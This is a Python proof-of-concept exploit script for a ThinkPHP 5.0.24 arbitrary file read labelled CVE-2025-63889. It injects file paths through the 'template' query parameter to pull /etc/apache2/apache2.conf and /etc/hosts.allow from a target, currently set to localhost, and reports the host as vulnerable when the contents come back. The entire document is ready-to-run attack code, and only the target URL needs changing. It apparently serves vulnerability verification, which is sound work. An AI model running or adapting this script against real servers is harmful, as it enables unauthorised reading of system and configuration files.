#!/usr/bin/env python3

import requests
import sys

TARGET_URL = "http://localhost:8080"

def test_file_read(path, description):
    payload = f"/?template={path}"
    url = TARGET_URL + payload
    print(f"[*] Testing: {description}")
    print(f"    Payload: {payload}")
    
    try:
        resp = requests.get(url, timeout=10)
        if resp.status_code == 200:
            return resp.text
        else:
            print(f"    Status: {resp.status_code}")
            return None
    except Exception as e:
        print(f"    Error: {e}")
        return None

def main():
    print("=" * 60)
    print("CVE-2025-63889 - ThinkPHP 5.0.24 Arbitrary File Read")
    print("=" * 60)
    print()
    
    try:
        resp = requests.get(TARGET_URL, timeout=10)
        if resp.status_code != 200:
            print("[!] Target is not accessible")
            return False
    except Exception as e:
        print(f"[!] Target connection error: {e}")
        return False
    print("[+] Target is accessible")
    print()
    
    test_path = "/etc/apache2/apache2.conf"
    content = test_file_read(test_path, "Read /etc/apache2/apache2.conf")
    
    if content and "ServerRoot" in content:
        print()
        print("[+] VULNERABLE - Arbitrary file read confirmed!")
        print()
        print("File content preview:")
        print("-" * 40)
        lines = content.split('\n')
        for line in lines[:10]:
            print(line)
        print("-" * 40)
        
        print()
        print("[*] Testing another file: /etc/hosts")
        hosts_content = test_file_read("/etc/hosts.allow", "Read /etc/hosts.allow")
        if hosts_content:
            print("[+] Successfully read /etc/hosts.allow")
        
        return True
    else:
        print()
        print("[-] Vulnerability not confirmed")
        return False

if __name__ == "__main__":
    try:
        result = main()
        sys.exit(0 if result else 1)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)
